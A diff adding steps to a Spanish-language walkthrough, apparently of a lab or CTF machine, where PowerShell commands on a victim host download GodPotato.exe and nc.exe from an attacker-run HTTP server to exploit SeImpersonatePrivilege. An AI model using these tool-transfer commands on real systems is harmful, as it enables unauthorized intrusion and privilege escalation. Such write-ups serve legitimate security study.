@@ -14,4 +14,15 @@ En la máquina atacante levantamos un servidor HTTP desde el directorio donde se
 ```bash
 python3 -m http.server 8000
 ```
+Ahora, desde la máquina víctima descargamos las herramientas:
+```
+Invoke-WebRequest -Uri "http://myipaddress:8000/GodPotato.exe" -OutFile "GodPotato.exe"
+Invoke-WebRequest -Uri "http://myipaddress:8000/nc.exe" -OutFile "nc.exe"
+```
 
+Comprobamos que ambos binarios hayan sido transferidos correctamente:
+
+dir GodPotato.exe
+dir nc.exe
+
+Con las herramientas disponibles en la máquina víctima, podemos continuar con la explotación de ```SeImpersonatePrivilege.```
